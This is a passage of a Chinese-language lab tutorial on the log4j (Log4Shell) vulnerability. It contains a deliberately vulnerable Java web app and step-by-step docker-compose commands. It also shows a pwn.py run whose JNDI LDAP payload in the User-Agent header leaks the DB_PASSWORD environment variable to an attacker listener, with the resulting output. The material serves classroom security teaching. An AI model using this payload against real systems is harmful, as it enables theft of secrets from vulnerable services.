

`import org.apache.logging.log4j.Logger;`

`import org.apache.logging.log4j.LogManager;`

`import static spark.Spark.*;`

`public class App {`

`static final Logger logger = LogManager.getLogger(App.class.getName());`

`public static void main(String[] args) {`

`port(8080);`

`get("/*", (req, res) -> {`

`String ua = req.headers("User-Agent");`

`String pwn = req.queryParams("pwn");`

`String pth = req.pathInfo();`

`System.out.println("logging ua: " + ua);`

`System.out.println("logging pwn: " + pwn);`

`System.out.println("logging pth: " + pth);`

`// trigger`

`logger.error(ua);`

`logger.error(pwn);`

`logger.error(pth);`

`return "ok: ua: " + ua + " " + "pwn: " + pwn + " pth:" + pth;`

`});`

`}`

`}`

## 漏洞应用运行端口

我们的漏洞应用运行在哪个端口？我们的攻击者容器中有 `pwn.py` 脚本，也是由 leonjza 编写的，它做了两件事：

1. 在后台运行一个伪 LDAP 服务器，监听端口 `8888`
2. 发送带有 JNDI URI 的请求，引用伪 LDAP 服务器以获取 Java 值来泄露数据
3. 解析并打印响应

使用此设置，我们可以展示如何利用 log4j 从运行中的进程泄露敏感信息。我们将使用它来泄露环境变量 `DB_PASSWORD` 的值。由于在运行中的容器上将密钥存储在环境变量中并不罕见，这应该足以让我们看到此漏洞利用有多么具有毁灭性。

首先，下载此实验室的 zip 存档，并在具有写入权限且可以在终端应用程序中导航的目录中解压缩。完成后，可以在该目录中输入 `docker-compose up` 来启动实验室。输出应类似于以下内容：

```
PS C:\Users\rxt1077\it230\labs\log4j> docker-compose up

[+] Running 2/0
- Container log4j-target-1    Created                                                            0.0s
- Container log4j-attacker-1  Created                                                            0.0s

Attaching to log4j-attacker-1, log4j-target-1

log4j-attacker-1 exited with code 0

log4j-target-1    | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.

log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog

log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...

log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:8080

log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1

log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0

log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults

log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms

log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}

log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms
```

你会注意到目标服务正在运行 `log4jpwn` 示例应用程序，并且其输出直接显示在屏幕上。攻击者服务会立即退出，因为它是为交互式使用而设计的，不会在后台运行任何内容。在另一个终端中，再次导航到实验室目录并运行 `docker-compose run attacker bash`。这将是你用来攻击目标的 shell：

```
PS C:\Users\rxt1077\it230\labs\log4j> docker-compose run attacker bash

root@3971c61303c8:/#
```

① 注意提示符在进入容器后如何更改。

在攻击 shell 中，使用 `ip` 命令确定容器的 IPv4 地址。我们需要这个地址，因为一旦利用字符串被记录，攻击者容器将监听来自目标的连接：

```
root@3971c61303c8:/# ip addr show dev eth0

58: eth0@if59: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default

link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0

inet <IP_ADDRESS>/16 brd 172.20.255.255 scope global eth0 ①

valid_lft forever preferred_lft forever
```

① 你的 IP 不是 `<IP_ADDRESS>`，而是你在其位置找到的任何内容！

一旦你获得 IP 地址，就可以在攻击者容器上运行 `pwn.py` 脚本，你应该能够读取目标容器上的 `DB_PASSWORD` 环境变量：

```
root@3971c61303c8:/# python /pwn.py --listen-host <IP_ADDRESS> --exploit-host <IP_ADDRESS> --target http://target:8080 --leak '${env:DB_PASSWORD}' ①

i| starting server on <IP_ADDRESS>:8888

i| server started

i| setting payload in User-Agent header

i| sending exploit payload ${jndi:ldap://<IP_ADDRESS>:8888/${env:DB_PASSWORD}} to http://target:8080/

i| new connection from <TARGETS_IP>:44050

v| extracted value: <DB_PASSWORD> ②

i| request url was: http://target:8080/
```

